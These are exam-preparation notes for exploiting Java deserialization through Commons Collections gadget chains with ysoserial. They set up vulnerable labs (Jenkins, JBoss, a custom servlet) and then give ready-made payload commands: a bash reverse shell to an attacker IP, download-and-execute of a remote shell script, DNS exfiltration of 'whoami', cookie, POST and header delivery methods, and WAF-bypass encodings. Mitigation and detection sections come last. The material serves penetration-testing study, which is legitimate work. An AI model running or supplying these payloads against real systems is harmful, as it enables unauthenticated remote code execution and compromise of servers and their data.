# Java Deserialization - Commons Collections RCE PoC Notes

## Vulnerability Summary
- **Target**: Java applications using Apache Commons Collections (3.x, 4.0)
- **CVE**: Multiple (CVE-2015-4852, CVE-2015-7501, CVE-2017-3506, CVE-2015-6420)
- **Type**: Insecure Deserialization → Remote Code Execution
- **Impact**: Unauthenticated remote code execution as application user

## Vulnerability Details

### Attack Chain
1. **Identify Deserialization**: Find endpoints that accept serialized Java objects
2. **Gadget Chain Construction**: Use ysoserial to build exploit chains via Commons Collections
3. **Payload Delivery**: Send malicious serialized object via HTTP (Cookie, POST, Header)
4. **Trigger Deserialization**: Server calls `readObject()` on untrusted data
5. **Chain Execution**: Transformer chain executes arbitrary code during deserialization
6. **RCE**: Achieve command execution via Runtime.exec() or ProcessBuilder

### Root Cause
Java's `ObjectInputStream.readObject()` automatically reconstructs object graphs from byte streams. When deserializing objects with specific classes (Commons Collections `InvokerTransformer`, `ChainedTransformer`, `ConstantTransformer`), attackers can construct "gadget chains" that execute arbitrary code during the deserialization process itself.

**Vulnerable Code Pattern:**
```java
// VULNERABLE - Never deserialize untrusted data!
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // Code execution happens HERE
```

**Gadget Chain Example (Commons Collections):**
```java
// Simplified view of CommonsCollections5 gadget chain
ConstantTransformer -> ChainedTransformer -> InvokerTransformer
    |
    └──> invoke("exec", Runtime.getRuntime(), ["calc.exe"])
```

---

## Lab Setup

### Prerequisites
- **ysoserial**: Gadget chain payload generator
- **Java**: JDK/JRE for running ysoserial
- **Vulnerable Application**: Jenkins 2.46.1, JBoss, WebLogic, or custom app
- **tcpdump** or **Wireshark**: For verification (ping callback)

### Download ysoserial
```bash
# Download latest ysoserial-master-SNAPSHOT.jar
cd poc-examples/java-deserialization-commons/payloads
wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

# Verify download
file ysoserial-master-SNAPSHOT.jar
# Output: ysoserial-master-SNAPSHOT.jar: Java archive data (JAR)

# List available gadget chains
java -jar ysoserial-master-SNAPSHOT.jar
# Output: CommonsCollections1-10, Spring1-2, ROME, Jdk7u21, etc.
```

### Option 1: Jenkins 2.46.1 (Docker)
```bash
# Pull vulnerable Jenkins version
docker pull jenkins/jenkins:2.46.1

# Run Jenkins (vulnerable to CVE-2017-1000353)
docker run -d -p 8080:8080 -p 50000:50000 --name jenkins-vuln jenkins/jenkins:2.46.1

# Jenkins will be available at http://localhost:8080
# CLI port 50000 accepts serialized objects without authentication

# Test connectivity
nc -zv localhost 50000
```

### Option 2: Custom Vulnerable Java Application
```java
// VulnerableServlet.java
import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;
import java.util.Base64;

public class VulnerableServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        // Get base64-encoded serialized object from POST parameter
        String data = request.getParameter("data");

        if (data != null) {
            try {
                // VULNERABLE: Deserializing untrusted data
                byte[] bytes = Base64.getDecoder().decode(data);
                ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
                Object obj = ois.readObject(); // RCE happens here!

                response.getWriter().println("Object deserialized: " + obj.getClass().getName());
            } catch (Exception e) {
                response.getWriter().println("Error: " + e.getMessage());
            }
        }
    }
}
```

### Option 3: JBoss AS 5.x/6.x
```bash
# Download JBoss AS 6.1.0.Final (vulnerable to deserialization)
wget https://downloads.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip
unzip jboss-as-distribution-6.1.0.Final.zip
cd jboss-6.1.0.Final/bin

# Start JBoss
./run.sh

# JBoss HTTP Invoker available at:
# http://localhost:8080/invoker/JMXInvokerServlet
```

### Verification Setup (Attacker Machine)
```bash
# Terminal 1: Start tcpdump to catch ping callbacks
sudo tcpdump -i any icmp and src <TARGET_IP>

# Terminal 2: Start netcat listener for reverse shells
nc -lvnp 4444

# Terminal 3: Run the PoC
python3 poc.py <TARGET_IP> 8080 <ATTACKER_IP> 4444
```

---

## Exploit Chain

### Stage 1: Manual Exploitation - Identify Deserialization

**Check for Java serialization magic bytes in responses:**
```bash
# Java serialization always starts with: AC ED 00 05
curl -i http://target:8080/app | xxd | grep "aced 0005"

# Common locations for serialized objects:
# - Cookies (especially JSESSIONID, viewstate)
# - POST parameters (data, object, state)
# - HTTP headers (X-Java-Object, Authorization)
# - RMI/JMX endpoints (often on high ports)
```

**Test for deserialization with innocent payload:**
```bash
# Generate a simple serialized string
echo -n "test" | java -jar ysoserial.jar CommonsCollections5 "echo test" | base64 -w0

# Send via curl (example: POST parameter)
curl -X POST http://target:8080/vulnerable \
  --data "data=<BASE64_PAYLOAD>"

# Look for Java exceptions in response:
# - ClassNotFoundException
# - StreamCorruptedException
# - InvalidClassException
# These indicate deserialization is happening!
```

### Stage 2: Manual Exploitation - Generate Payload

**Generate ysoserial payload for ping callback:**
```bash
# Linux target (ping 4 packets)
java -jar payloads/ysoserial-master-SNAPSHOT.jar CommonsCollections5 \
  "ping -c 4 10.10.14.5" > payload.bin

# Windows target (ping 4 packets)
java -jar payloads/ysoserial-master-SNAPSHOT.jar CommonsCollections5 \
  "ping -n 4 10.10.14.5" > payload.bin

# View payload size
ls -lh payload.bin
# Typical size: 1.5-3KB depending on gadget chain

# Base64 encode for HTTP transport
base64 -w0 payload.bin > payload.b64
```

**Available Gadget Chains:**
| Gadget Chain | Commons Collections Version | Reliability | Notes |
|--------------|----------------------------|-------------|-------|
| CommonsCollections1 | 3.0-3.2.1 | High | Original PoC, widely tested |
| CommonsCollections5 | 3.1-3.2.1 | High | Recommended, stable |
| CommonsCollections6 | 3.1-3.2.1 | High | Alternative to CC5 |
| CommonsCollections2 | 4.0 | Medium | For Commons Collections 4.0 |
| CommonsCollections7 | 3.1-3.2.1 | Medium | Longer chain, more complex |

**Testing different commands:**
```bash
# Sleep for timing-based detection
java -jar ysoserial.jar CommonsCollections5 "sleep 5" | base64 -w0

# DNS callback (out-of-band detection)
java -jar ysoserial.jar CommonsCollections5 \
  "nslookup $(whoami).attacker.com" | base64 -w0

# Reverse shell (Bash)
java -jar ysoserial.jar CommonsCollections5 \
  "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" | base64 -w0

# Download and execute
java -jar ysoserial.jar CommonsCollections5 \
  "wget http://10.10.14.5/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh" | base64 -w0
```

### Stage 3: Manual Exploitation - Deliver Payload

**Method 1: Via Cookie**
```bash
# Send payload in cookie
PAYLOAD=$(cat payload.b64)
curl http://target:8080/vulnerable \
  -H "Cookie: user_data=$PAYLOAD" \
  -i
```

**Method 2: Via POST Parameter**
```bash
# Send payload in POST data
PAYLOAD=$(cat payload.b64)
curl -X POST http://target:8080/vulnerable \
  -d "data=$PAYLOAD" \
  -i
```

**Method 3: Via Custom Header**
```bash
# Some apps deserialize custom headers
PAYLOAD=$(cat payload.b64)
curl http://target:8080/vulnerable \
  -H "X-Java-Object: $PAYLOAD" \
  -i
```

**Method 4: Via RMI/JMX (Jenkins example)**
```bash
# Send raw payload to Jenkins CLI port (no base64 needed)
cat payload.bin | nc target 50000
```

### Stage 4: Manual Exploitation - Verify RCE

**Verification Method 1: Ping Callback**
```bash
# On attacker machine (10.10.14.5)
sudo tcpdump -i any icmp and src <TARGET_IP>

# If you see ICMP packets, RCE is confirmed:
# 10.10.14.5 > target: ICMP echo reply, id 1234, seq 1
# 10.10.14.5 > target: ICMP echo reply, id 1234, seq 2
```

**Verification Method 2: Time-Based (Sleep)**
```bash
# Send sleep payload
time curl http://target:8080/vulnerable -d "data=$PAYLOAD"

# If response takes ~5 seconds, RCE confirmed
# Output: real    0m5.234s
```

**Verification Method 3: Reverse Shell**
```bash
# On attacker machine
nc -lvnp 4444

# If connection received:
# listening on [any] 4444 ...
# connect to [10.10.14.5] from target [192.168.1.10] 45678
# bash: no job control in this shell
# tomcat@target:/opt/tomcat$
```

**Verification Method 4: DNS Callback (Burp Collaborator)**
```bash
# Generate DNS callback payload
java -jar ysoserial.jar CommonsCollections5 \
  "nslookup unique-id.burpcollaborator.net" | base64 -w0

# Check Burp Collaborator for DNS queries
# If DNS query received, RCE confirmed
```

---

## Testing Commands

### Basic PoC Usage
```bash
# Navigate to PoC directory
cd poc-examples/java-deserialization-commons

# Basic ping callback test
python3 poc.py 192.168.1.10 8080 10.10.14.5 4444

# Reverse shell
python3 poc.py 192.168.1.10 8080 10.10.14.5 4444 \
  --command reverse_shell --gadget CommonsCollections6

# Custom endpoint and POST delivery
python3 poc.py 192.168.1.10 8080 10.10.14.5 4444 \
  --endpoint /api/deserialize --delivery post --param-name object

# Through Burp proxy for debugging
python3 poc.py 192.168.1.10 8080 10.10.14.5 4444 \
  --proxy http://127.0.0.1:8080

# Jenkins CLI port exploitation
python3 poc.py 192.168.1.10 50000 10.10.14.5 4444 \
  --endpoint / --delivery post
```

### Manual Verification Commands
```bash
# Monitor for ping callbacks
sudo tcpdump -i eth0 icmp and src 192.168.1.10

# Listen for reverse shell
nc -lvnp 4444

# Check if ysoserial is working
java -jar payloads/ysoserial-master-SNAPSHOT.jar CommonsCollections5 "id"

# Test Java is installed
java -version
```

---

## Bypass Techniques

### WAF Bypass - Multiple Encoding
```bash
# Double base64 encoding
java -jar ysoserial.jar CommonsCollections5 "id" | base64 | base64 -w0

# URL encoding
java -jar ysoserial.jar CommonsCollections5 "id" | base64 -w0 | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))"

# Gzip compression + base64
java -jar ysoserial.jar CommonsCollections5 "id" | gzip | base64 -w0
```

### Alternative Gadget Chains
```bash
# If CommonsCollections blocked, try:
# - Spring1, Spring2 (Spring Framework)
# - ROME (ROME library)
# - Jdk7u21 (JDK <=7u21)
# - CommonsCollections10 (newer variant)

java -jar ysoserial.jar Spring1 "whoami" | base64 -w0
java -jar ysoserial.jar ROME "whoami" | base64 -w0
```

### Command Execution Alternatives
```bash
# If Runtime.exec() blocked, use ProcessBuilder
# (Some gadget chains support this automatically)

# Write file instead of direct exec
java -jar ysoserial.jar CommonsCollections5 \
  "echo '#!/bin/bash' > /tmp/shell.sh && echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /tmp/shell.sh"

# Then trigger execution in second request
java -jar ysoserial.jar CommonsCollections5 "bash /tmp/shell.sh"
```

---

## Debugging

### Common Failure Points

**1. ClassNotFoundException**
```
Problem: Target doesn't have Commons Collections library
Solution: Try different gadget chains (Spring, ROME, JDK7u21)
```

**2. No Response / Timeout**
```
Problem: May indicate successful exploitation (process hung)
Solution: Check for callbacks, verify listener is running
```

**3. InvalidClassException**
```
Problem: Serialization version mismatch
Solution: Normal for gadget chains, doesn't indicate failure
```

**4. No Callback Received**
```
Problem: Network filtering, firewall, wrong IP
Solution:
  - Verify attacker IP is reachable from target
  - Try DNS callback instead of ICMP
  - Use out-of-band channels (HTTP, DNS)
```

### Diagnostic Commands
```bash
# Verify ysoserial works locally
java -jar payloads/ysoserial-master-SNAPSHOT.jar CommonsCollections5 "calc.exe" > test.bin
java -cp payloads/ysoserial-master-SNAPSHOT.jar:/path/to/commons-collections.jar Test test.bin

# Check payload size (should be 1-3KB)
ls -lh payload.bin

# Verify base64 encoding
cat payload.b64 | base64 -d | xxd | head
# Should start with: aced 0005 (Java serialization magic bytes)

# Test connectivity
nc -zv target 8080
nc -zv target 50000

# Monitor all traffic
sudo tcpdump -i any -w capture.pcap host <TARGET_IP>
```

---

## Mitigation

### Developer Fixes
1. **Never deserialize untrusted data** - This is the golden rule
2. **Use safe alternatives**:
   ```java
   // GOOD: Use JSON instead
   ObjectMapper mapper = new ObjectMapper();
   MyObject obj = mapper.readValue(jsonString, MyObject.class);
   ```
3. **Implement custom deserialization with validation**:
   ```java
   // Override resolveClass to whitelist allowed classes
   class SafeObjectInputStream extends ObjectInputStream {
       @Override
       protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
           if (!isAllowed(desc.getName())) {
               throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
           }
           return super.resolveClass(desc);
       }
   }
   ```
4. **Remove vulnerable libraries**: Update Commons Collections to 3.2.2+ or 4.1+
5. **Use Look-Ahead Java Deserialization (JEP 290)**: Available in Java 9+

### Server Configuration
```bash
# Remove Commons Collections if not needed
rm -f /opt/tomcat/lib/commons-collections-*.jar

# Update to safe versions
# Commons Collections 3.2.2 or 4.1+ have mitigations

# Disable RMI/JMX if not needed
# In Tomcat server.xml:
# <Listener className="org.apache.catalina.mbeans.JmxRemoteLifecycleListener"
#           rmiRegistryPortPlatform="9999" rmiServerPortPlatform="9998" />
# Comment out or remove
```

### Detection
```bash
# Search for vulnerable code patterns
grep -r "ObjectInputStream" /path/to/source/
grep -r "readObject()" /path/to/source/

# Check for vulnerable libraries
find /opt/tomcat/lib -name "commons-collections-*.jar" -exec echo {} \;

# Monitor for deserialization attacks (Snort rule)
alert tcp any any -> any any (msg:"Java Deserialization Attack"; content:"|ac ed 00 05|"; sid:1000001;)
```

---

## OSWE Exam Notes

### Key Takeaways
1. **Black-box identification**: Look for Java stack traces, server headers (Tomcat, JBoss), and cookies with base64 content
2. **Source code markers**: `ObjectInputStream.readObject()` is the critical vulnerability point
3. **Gadget chain selection**: CommonsCollections5/6 are most reliable; try multiple if one fails
4. **Verification methods**: Ping callbacks work best in exam; out-of-band DNS is alternative
5. **Time management**: Pre-generate payloads to save exam time; keep ysoserial ready

### Time Management
- **Recon + Identification**: 10-15 minutes
- **Payload generation**: 5 minutes (if ysoserial is pre-configured)
- **Exploitation attempts**: 10-20 minutes
- **Verification**: 5-10 minutes
- **Total**: 30-50 minutes

### Pre-Exam Checklist
- [ ] Download and test ysoserial.jar locally
- [ ] Verify Java is installed and in PATH
- [ ] Pre-generate common payloads (ping, sleep, reverse shell)
- [ ] Test PoC against local vulnerable app (Jenkins docker)
- [ ] Familiarize with all delivery methods (cookie, POST, header)
- [ ] Set up tcpdump/Wireshark for verification
- [ ] Know how to read Java stack traces for debugging

### Common Exam Scenarios
- **Scenario 1**: Jenkins with exposed CLI port (50000) - Direct binary payload
- **Scenario 2**: Custom webapp with POST parameter - Base64-encoded payload
- **Scenario 3**: Cookie-based deserialization - Base64 in Cookie header
- **Scenario 4**: REST API with JSON - Embedded base64 in JSON field

### Exam Tips
- Always try ping callback first (easiest to verify)
- If no outbound connectivity, use sleep-based timing attacks
- Document all gadget chains attempted in exam report
- Take screenshots of successful ping callbacks or shell connections
- Check both HTTP and non-HTTP services (RMI on 1099, JMX on 9999, etc.)

### Red Flags in Source Code
```java
// VULNERABLE
ObjectInputStream ois = new ObjectInputStream(...);
obj = ois.readObject();

// Check what libraries are imported
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
// If you see these, deserialization RCE is very likely
```

### Quick Reference Commands
```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections5 "ping -c 4 $ATTACKER_IP" | base64 -w0

# Send via curl (POST)
curl -X POST http://$TARGET/vuln -d "data=$PAYLOAD"

# Verify (tcpdump)
sudo tcpdump -i any icmp and src $TARGET_IP
```

---

## References
- ysoserial: https://github.com/frohoff/ysoserial
- Java Deserialization Cheat Sheet: https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
- FoxGlove Security Blog: https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
- Marshalsec: https://github.com/mbechler/marshalsec
- JEP 290 (Deserialization Filtering): https://openjdk.java.net/jeps/290
